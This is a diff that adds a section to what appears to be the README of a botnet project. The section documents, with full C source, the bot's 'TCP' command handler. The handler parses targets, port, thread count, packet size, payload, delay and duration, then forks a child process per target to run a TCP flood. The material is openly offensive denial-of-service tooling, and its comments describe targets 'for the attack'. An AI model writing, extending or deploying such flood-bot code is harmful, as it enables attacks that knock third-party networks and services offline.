@@ -730,6 +730,85 @@ There are multiple command cases that this function deals with, based on the inp
 
 It has the ability to parse all the input commands and fork each command off into parallel helper functions that will actually execute what each command does.
 
+Bellow is a breakdown of each of the possible commands:
+
+#### TCP
+
+```c
+if (strcmp(commands[0], "TCP") == 0) {
+    //Ensure there are at least 6 tokens:
+    //commands[0] = "TCP"
+    //commands[1] = target(s)
+    //commands[2] = port
+    //commands[3] = thread count
+    //commands[4] = packet size
+    //commands[5] = payload
+    if (num_of_tokens < 6) {
+        return;
+    }
+
+    // comma-separated IP(s)
+    char *target_list   = commands[1];
+
+    // target TCP port           
+    int   port          = atoi(commands[2]);
+
+    // number of parallel threads     
+    int   thread_count  = atoi(commands[3]);
+
+    // size of each packet     
+    int   packet_size   = atoi(commands[4]);
+
+    // extra data to include in the packet     
+    char *payload       = commands[5];           
+
+    // If statement which controls duration in seconds, if none provided default to 10 seconds.
+    int duration = (num_of_tokens == 8) ? atoi(commands[7]) : 10;
+
+    // If statement which controls inter-packet delay in milliseconds, if none provided default to 0ms.
+    int delay = (num_of_tokens >= 7) ? atoi(commands[6]) : 0;
+
+    // Check how many targets have been selected for the attack, single vs multiple
+    char *commaPos = strchr(target_list, ',');
+    if (commaPos == NULL) {
+        // Single target case, also where listFork() is invoked which forks off the process to a child
+        int fork_result = listFork();
+        if (fork_result != 0) {
+            return;
+        }
+        // Child runs the flood after the fork
+        ftcp(target_list,
+             port,
+             thread_count,
+             packet_size,
+             payload,
+             delay,
+             duration);
+        _exit(0);
+    } else {
+        // Multiple target case.
+        char *target = strtok(target_list, ",");
+        while (target != NULL) {
+            // Starts forking off all the targets to a different child
+            int fork_result = listFork();
+            if (fork_result == 0) {
+                // Child handles its specific target
+                ftcp(target,
+                     port,
+                     thread_count,
+                     packet_size,
+                     payload,
+                     delay,
+                     duration);
+                _exit(0);
+            }
+            // Parent moves on to the next target
+            target = strtok(NULL, ",");
+        }
+    }
+}
+```
+
 # Bot behaviour
 
 # Python Remake
